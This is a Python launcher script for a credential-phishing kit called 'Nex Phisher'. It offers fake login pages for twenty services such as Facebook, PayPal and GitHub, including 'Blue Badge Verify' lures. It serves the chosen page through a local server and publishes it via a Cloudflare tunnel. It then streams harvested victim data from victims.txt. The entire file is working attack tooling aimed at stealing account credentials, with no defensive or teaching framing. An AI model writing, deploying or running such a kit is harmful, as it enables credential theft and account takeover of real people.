import os, subprocess, time, re, sys
from colorama import Fore, Style, init

init(autoreset=True)

def banner():
    os.system('clear')
    print(f"{Fore.GREEN}{Style.BRIGHT}  _   _             ____  _     _     _               ")
    print(f"{Fore.GREEN}{Style.BRIGHT} | \ | | _____  __ |  _ \| |__ (_)___| |__   ___ _ __ ")
    print(f"{Fore.GREEN}{Style.BRIGHT} |  \| |/ _ \ \/ / | |_) | '_ \| / __| '_ \ / _ \ '__|")
    print(f"{Fore.YELLOW}{Style.BRIGHT} | |\  |  __/>  <  |  __/| | | | \__ \ | | |  __/ |   ")
    print(f"{Fore.YELLOW}{Style.BRIGHT} |_| \_|\___/_/\_\ |_|   |_| |_|_|___/_| |_|\___|_|   ")
    print(f"{Fore.CYAN}============================================================")
    print(f"{Fore.WHITE} [BY : MED RAYEN BOUAZIZI] | [LABS : QUANTUM NEXUS]")
    print(f"{Fore.CYAN}============================================================\n")

def get_tunnel_link():
    if os.path.exists("tunnel.log"):
        with open("tunnel.log", "r") as f:
            match = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", f.read())
            return match.group(0) if match else None
    return None

def main():
    banner()
    print(f"{Fore.RED}[::] Select An Attack For Your Victim [::]\n")
    
    platforms = [
        "Facebook", "Instagram", "Google", "Microsoft", "Netflix", 
        "PayPal", "Steam", "Twitter", "Playstation", "GitHub",
        "Twitch", "Pinterest", "Snapchat", "Linkedin", "Ebay",
        "Dropbox", "Protonmail", "Spotify", "Reddit", "Adobe"
    ]

    for i in range(0, len(platforms), 2):
        p1 = f"[{str(i+1).zfill(2)}] {platforms[i]}"
        p2 = f"[{str(i+2).zfill(2)}] {platforms[i+1]}" if i+1 < len(platforms) else ""
        print(f"{Fore.YELLOW}{p1.ljust(20)} {Fore.YELLOW}{p2}")

    print(f"{Fore.YELLOW}\n[99] About         [00] Exit")
    
    choice = input(f"\n{Fore.GREEN}[~] Select an option: {Fore.WHITE}")
    
    if choice == "00": sys.exit()
    target = platforms[int(choice)-1].lower()

    # Sub-menu as seen in your image
    print(f"\n{Fore.CYAN}[01] Traditional Login Page")
    print(f"{Fore.CYAN}[02] Auto Followers Login Page")
    print(f"{Fore.CYAN}[03] Blue Badge Verify Login Page")
    sub_choice = input(f"\n{Fore.GREEN}[~] Select an option: {Fore.WHITE}")

    # Process Management
    subprocess.run(["pkill", "-f", "cloudflared"], stdout=subprocess.DEVNULL)
    subprocess.run(["pkill", "-f", "server.py"], stdout=subprocess.DEVNULL)
    if os.path.exists("tunnel.log"): os.remove("tunnel.log")

    # Launching Services
    print(f"\n{Fore.BLUE}[*] Starting {target.upper()} Server...")
    subprocess.Popen(["python", "server.py", target], stdout=subprocess.DEVNULL)
    
    print(f"{Fore.BLUE}[*] Launching International Tunnel...")
    with open("tunnel.log", "w") as log:
        subprocess.Popen(["cloudflared", "tunnel", "--url", "http://127.0.0.1:5000"], stdout=log, stderr=log)

    print(f"{Fore.YELLOW}[*] Waiting for Global Link (12s)...")
    time.sleep(12)
    
    url = get_tunnel_link()
    if url:
        print(f"\n{Fore.MAGENTA}{Style.BRIGHT}🔗 INTERNATIONAL LINK: {Fore.WHITE}{url}")
    else:
        print(f"{Fore.RED}[!] Tunnel failed. Check internet.")

    print(f"\n{Fore.WHITE}--- {Fore.GREEN}DATA CAPTURE ACTIVE {Fore.WHITE}---")
    try:
        subprocess.run(["tail", "-f", "victims.txt"])
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Stopping Quantum Nexus System...")

if __name__ == "__main__":
    main()

